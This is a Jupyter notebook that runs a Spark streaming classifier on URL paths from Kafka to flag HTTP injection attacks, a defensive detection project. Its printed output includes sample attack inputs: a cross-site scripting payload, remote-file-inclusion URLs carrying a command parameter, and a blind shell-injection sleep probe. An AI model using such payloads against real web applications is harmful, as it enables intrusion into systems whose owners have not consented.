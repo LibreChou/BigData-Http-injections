{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Requierments\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: findspark in /home/linuxu/anaconda3/lib/python3.7/site-packages (1.3.0)\n",
      "Requirement already satisfied: confluent-kafka in /home/linuxu/anaconda3/lib/python3.7/site-packages (1.4.1)\n",
      "--2020-04-24 17:59:28--  https://repo1.maven.org/maven2/org/apache/spark/spark-streaming-kafka-0-8-assembly_2.11/2.4.0/spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar\n",
      "Resolving repo1.maven.org (repo1.maven.org)... 151.101.112.209\n",
      "Connecting to repo1.maven.org (repo1.maven.org)|151.101.112.209|:443... connected.\n",
      "HTTP request sent, awaiting response... 200 OK\n",
      "Length: 13385346 (13M) [application/java-archive]\n",
      "Saving to: ‘spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar.1’\n",
      "\n",
      "spark-streaming-kaf 100%[===================>]  12.76M  4.96MB/s    in 2.6s    \n",
      "\n",
      "2020-04-24 17:59:31 (4.96 MB/s) - ‘spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar.1’ saved [13385346/13385346]\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!pip install findspark\n",
    "!pip install confluent-kafka\n",
    "# Downloaded from https://mvnrepository.com/artifact/org.apache.spark/spark-streaming-kafka-0-8-assembly_2.11\n",
    "!wget https://repo1.maven.org/maven2/org/apache/spark/spark-streaming-kafka-0-8-assembly_2.11/2.4.0/spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import findspark\n",
    "findspark.init('/usr/local/spark/spark-2.4.0-bin-hadoop2.7')\n",
    "os.environ['PYSPARK_SUBMIT_ARGS'] = '--jars spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar pyspark-shell'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <div>\n",
       "            <p><b>SparkContext</b></p>\n",
       "\n",
       "            <p><a href=\"http://192.168.90.36:4040\">Spark UI</a></p>\n",
       "\n",
       "            <dl>\n",
       "              <dt>Version</dt>\n",
       "                <dd><code>v2.4.0</code></dd>\n",
       "              <dt>Master</dt>\n",
       "                <dd><code>local[2]</code></dd>\n",
       "              <dt>AppName</dt>\n",
       "                <dd><code>BigData</code></dd>\n",
       "            </dl>\n",
       "        </div>\n",
       "        "
      ],
      "text/plain": [
       "<SparkContext master=local[2] appName=BigData>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pyspark\n",
    "from pyspark import SparkContext\n",
    "from pyspark.streaming import StreamingContext\n",
    "from pyspark.sql import SQLContext, Row\n",
    "from pyspark.sql.types import StructType, StructField, DoubleType, StringType, IntegerType\n",
    "from pyspark.sql.functions import udf\n",
    "from pyspark.ml.feature import CountVectorizerModel, IDFModel, StandardScalerModel, Tokenizer\n",
    "from pyspark.ml.classification import LogisticRegressionModel\n",
    "from pyspark.streaming.kafka import KafkaUtils\n",
    "\n",
    "from urllib.parse import unquote\n",
    "\n",
    "APP_NAME = \"BigData\"\n",
    "conf = pyspark.SparkConf().setAll([ ('spark.app.name', APP_NAME),\n",
    "                                    ('spark.executor.memory', '8g'),\n",
    "                                    ('spark.cores.max', '2'),\n",
    "                                    ('spark.driver.memory','8g'),\n",
    "                                   ('spark.master', 'local[2]')])\n",
    "sc = SparkContext(conf=conf)\n",
    "sqlc = SQLContext(sc)\n",
    "sc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ready to run\n"
     ]
    }
   ],
   "source": [
    "def to_ngram(payload_obj):\n",
    "    n=2\n",
    "    payload = str(payload_obj)\n",
    "    ngrams = ''\n",
    "    for i in range(0,len(payload)-n + 1):\n",
    "        ngrams += payload[i:i+n]+ ' '\n",
    "    return ngrams[:-1]\n",
    "\n",
    "ngrams = udf(to_ngram, StringType())\n",
    "tokenizer = Tokenizer.load('../models/Tokenizer')\n",
    "vectorizer = CountVectorizerModel.load('../models/Vectorizer')\n",
    "idf_model = IDFModel.load('../models/idf')\n",
    "scalerModel = StandardScalerModel.load('../models/scalerModel')\n",
    "model = LogisticRegressionModel.load('../models/Logistic_Regression_Model')\n",
    "\n",
    "\n",
    "topic = \"test\"\n",
    "brokers = \"localhost:9092\"\n",
    "ssc = StreamingContext(sc, batchDuration= 3)\n",
    "kvs = KafkaUtils.createDirectStream(ssc, [topic], {\"metadata.broker.list\": brokers})\n",
    "\n",
    "\n",
    "print(\"ready to run\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def to_ngram(payload_obj):\n",
    "    n=2\n",
    "    payload = str(payload_obj)\n",
    "    ngrams = []\n",
    "    for i in range(0,len(payload)-n+1):\n",
    "        ngrams.append(payload[i:i+n])\n",
    "    return ngrams\n",
    "\n",
    "\n",
    "def get_prediction(queries):\n",
    "\n",
    "    try:\n",
    "        queries = queries.map(lambda w: Row(payload=w))\n",
    "        queries = sqlc.createDataFrame(queries)\n",
    "        queries = queries.withColumn('ngrams', ngrams(queries['payload']))\n",
    "        queries = tokenizer.transform(queries)\n",
    "        queries = vectorizer.transform(queries)\n",
    "        queries = idf_model.transform(queries)\n",
    "        queries = scalerModel.transform(queries)\n",
    "        preds = model.transform(queries)\n",
    "        preds.select('payload','prediction').show(truncate=False)\n",
    "    except : \n",
    "        print('No data')\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No data\n",
      "No data\n",
      "No data\n",
      "No data\n",
      "+--------------------------------------+----------+\n",
      "|payload                               |prediction|\n",
      "+--------------------------------------+----------+\n",
      "|/tagarela 1/                          |0.0       |\n",
      "|/realplayer10/                        |0.0       |\n",
      "|/6404573/                             |0.0       |\n",
      "|/000023953/                           |0.0       |\n",
      "|/_mocks/                              |0.0       |\n",
      "|/javascript/oaerrordetailpage.svn-base|0.0       |\n",
      "|/041440/                              |0.0       |\n",
      "|/mgnews/                              |0.0       |\n",
      "|/123004/                              |0.0       |\n",
      "|/nettoys/                             |0.0       |\n",
      "|/flag_japan/                          |0.0       |\n",
      "|/666865/                              |0.0       |\n",
      "|/136421/                              |0.0       |\n",
      "|/javascript/todo.trace                |0.0       |\n",
      "|/directory_com-coo/                   |0.0       |\n",
      "|/seagate pro firewall  an crack/      |0.0       |\n",
      "|/javascript/cgm-web.lib               |0.0       |\n",
      "|/welcome-spammers/                    |0.0       |\n",
      "|/text_messaging/                      |0.0       |\n",
      "|/css/smoothness/jquery-ui.css         |0.0       |\n",
      "+--------------------------------------+----------+\n",
      "\n",
      "+--------------------------+----------+\n",
      "|payload                   |prediction|\n",
      "+--------------------------+----------+\n",
      "|/1781603338/              |0.0       |\n",
      "|/entete-sponsors/         |0.0       |\n",
      "|/javascript/uploader.sfish|0.0       |\n",
      "|/main286344/              |0.0       |\n",
      "|+sqlvuln                  |0.0       |\n",
      "|/thb_bb104s1301/          |0.0       |\n",
      "|/javascript/kids.cgi      |0.0       |\n",
      "|/pornmeister_lia/         |0.0       |\n",
      "|/hisaksson05/             |0.0       |\n",
      "|/gartner_announcement/    |0.0       |\n",
      "+--------------------------+----------+\n",
      "\n",
      "+--------------------------------------------------------------------------------------------------------+----------+\n",
      "|payload                                                                                                 |prediction|\n",
      "+--------------------------------------------------------------------------------------------------------+----------+\n",
      "|/120x60marketplace1/                                                                                    |0.0       |\n",
      "|/aycanushka/                                                                                            |0.0       |\n",
      "|/balanced diet/                                                                                         |0.0       |\n",
      "|/blackdeckerirons220/                                                                                   |0.0       |\n",
      "|/javascript/cgi-pub.xls                                                                                 |0.0       |\n",
      "|/wage conference summary.pdf/                                                                           |0.0       |\n",
      "|/csowebcast_oracle/                                                                                     |0.0       |\n",
      "|/submissions/                                                                                           |0.0       |\n",
      "|/sec_jointwar/                                                                                          |0.0       |\n",
      "|/kerst2005/                                                                                             |0.0       |\n",
      "|/ingree/                                                                                                |0.0       |\n",
      "|/telecomm/                                                                                              |0.0       |\n",
      "|/comp_news/                                                                                             |0.0       |\n",
      "|/cocacola/                                                                                              |0.0       |\n",
      "|/examples/jsp/checkbox/error.php?selected_theme=<script>alert(uebimiau_selected_theme_xss.nasl)</script>|1.0       |\n",
      "|/20050706/                                                                                              |0.0       |\n",
      "|/serielimitee/                                                                                          |0.0       |\n",
      "|/181345/                                                                                                |0.0       |\n",
      "|/1210598223/                                                                                            |0.0       |\n",
      "|/000023136/                                                                                             |0.0       |\n",
      "+--------------------------------------------------------------------------------------------------------+----------+\n",
      "\n",
      "+----------------------------------------------------------------------------------------+----------+\n",
      "|payload                                                                                 |prediction|\n",
      "+----------------------------------------------------------------------------------------+----------+\n",
      "|/image icon converter v1/                                                               |0.0       |\n",
      "|/1163871338580/                                                                         |0.0       |\n",
      "|/xml-xindice/                                                                           |0.0       |\n",
      "|/bannerper/                                                                             |0.0       |\n",
      "|/admin/news.admin.php?path_to_script=http://192.168.202.118:8080/tzhfyzkbomspvm??&cmd=ls|1.0       |\n",
      "|/w3c-translators/                                                                       |0.0       |\n",
      "|/index.php?txt=http://192.168.202.118:8080/ghl9il?                                      |0.0       |\n",
      "|/dprframeweb/                                                                           |0.0       |\n",
      "|/download-001005405/                                                                    |0.0       |\n",
      "|/javascript/fb.pfx                                                                      |0.0       |\n",
      "+----------------------------------------------------------------------------------------+----------+\n",
      "\n",
      "+--------------------------------+----------+\n",
      "|payload                         |prediction|\n",
      "+--------------------------------+----------+\n",
      "|/img_3045/                      |0.0       |\n",
      "|/standevidenceonidcardstohasc/  |0.0       |\n",
      "|/90x90_20061213175311/          |0.0       |\n",
      "|/1111704/                       |0.0       |\n",
      "|/356772/                        |0.0       |\n",
      "|/photo_puzzle/                  |0.0       |\n",
      "|/177922/                        |0.0       |\n",
      "|/010107/                        |0.0       |\n",
      "|/javascript/definition.stackdump|0.0       |\n",
      "|/javascript/include.war         |0.0       |\n",
      "|/warkanoid_2/                   |0.0       |\n",
      "|/kfibbk15.ashx                  |0.0       |\n",
      "|/clanki/                        |0.0       |\n",
      "|/javascript/engine.jsf          |0.0       |\n",
      "|/worldwidecustomersites/        |0.0       |\n",
      "|/board_alt/                     |0.0       |\n",
      "|/new woman platinum collection/ |0.0       |\n",
      "|/morales121506opn/              |0.0       |\n",
      "|/113460536908792619/            |0.0       |\n",
      "|/eurocis2007/                   |0.0       |\n",
      "+--------------------------------+----------+\n",
      "\n",
      "+--------------------------------------------------------------------------------------------+----------+\n",
      "|payload                                                                                     |prediction|\n",
      "+--------------------------------------------------------------------------------------------+----------+\n",
      "|/javascript/ingress.properties                                                              |0.0       |\n",
      "|/_shoutcast/                                                                                |0.0       |\n",
      "|/msi traymanager/                                                                           |0.0       |\n",
      "|/cs_indiana/                                                                                |0.0       |\n",
      "|\n",
      " str=$(echo MKJXCW)\n",
      " str1=${#str}\n",
      " if [ 4 -ne ${str1} ]\n",
      " then sleep 0\n",
      " else sleep 1\n",
      " fi %27|1.0       |\n",
      "|/intro_black/                                                                               |0.0       |\n",
      "|/javascript/computer.cfm                                                                    |0.0       |\n",
      "|/javascript/software.asmx                                                                   |0.0       |\n",
      "|/girlfriend135/                                                                             |0.0       |\n",
      "|/20051220-11/                                                                               |0.0       |\n",
      "+--------------------------------------------------------------------------------------------+----------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "queries = kvs.map(lambda x: unquote(x[1]))\n",
    "# ngrams = queries.map(lambda x: to_ngram(x))\n",
    "queries.foreachRDD(get_prediction)\n",
    "\n",
    "\n",
    "ssc.start()\n",
    "ssc.awaitTermination()  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
